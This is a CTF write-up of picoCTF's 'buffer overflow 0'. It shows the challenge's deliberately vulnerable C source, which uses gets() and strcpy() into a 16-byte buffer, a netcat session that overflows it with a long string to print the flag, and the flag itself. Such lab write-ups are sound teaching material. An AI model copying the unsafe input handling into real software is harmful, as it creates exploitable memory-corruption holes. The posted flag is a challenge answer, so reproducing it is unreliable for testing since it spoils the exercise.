# 1. buffer overflow 0

> Let's start off simple, can you overflow the correct buffer? The program is available `here`. You can view source `here`.
Connect using:
nc saturn.picoctf.net 49460

## Solution:
In this challenge we have a C program whose code is as following-  
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
    printf("%s\n", flag);
    fflush(stdout);
    exit(1);
}

void vuln(char *input){
    char buf2[16];
    strcpy(buf2, input);
}

int main(int argc, char **argv){

    FILE *f = fopen("flag.txt","r");
    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                        "own debugging flag.\n");
        exit(0);
    }
    fgets(flag,FLAGSIZE_MAX,f);
    signal(SIGSEGV, sigsegv_handler); // Set up signal handler

    gid_t gid = getegid();
    setresgid(gid, gid, gid);


    printf("Input: ");
    fflush(stdout);
    char buf1[100];
    gets(buf1);
    vuln(buf1);
    printf("The program will exit now\n");
    return 0;
}
```  
So this program takes the takes the input for the string `flag` from the `flag.txt`, so we need a way to print `flag`.  
This program also sets up a signal `signal(SIGSEGV, sigsegv_handler);`, what this means is that if the OS sends a SIGSEGV or a segmentation fault then it would call the `sigsev_handler` function.  
```c
void sigsegv_handler(int sig) {
    printf("%s\n", flag);
    fflush(stdout);
    exit(1);
}
```  
What this function will do is that if a segmentation fault occured it would print the flag for us and that is what we need.  
Trying out a string in this program-  
```bash
lallu@VedantLohan:~/picoctf/bina$ nc saturn.picoctf.net 61244
Input: qwdqwdwq
The program will exit now
^C
```  
and it doesn't give us the flag, for a segmentation fault to occur we can overflow the buffer for the gets() function being used to take in the input. So we just spam a lot of chars to overflow it and print the flag.  
```bash
lallu@VedantLohan:~/picoctf/bina$ nc saturn.picoctf.net 56392
Input: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
^C
```

## Flag:

```
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```

## Concepts learnt:
- Learned about signals in C, they inform the program of an event happening such as an error.  
- Buffer overflow happens when a program attempts to hold more memory than it was intended to, this causes the data to leak to adjacent memory locations and can overwrite the data there.  
- gid_t is an integer data type used to represent group IDs  .
- getgid(): Returns the real group ID of the calling process.  
- segfault is a crash that occurs when a program tries to access memory it's not allowed to access.  

## Notes:
- I was trying to compile this provided code to run it, but it had errors present in it. The challenge was intended to be solved on the server beacuse it needs the flag.txt file.

## Resources:
[signals](https://www.geeksforgeeks.org/c/signals-c-language/)

***


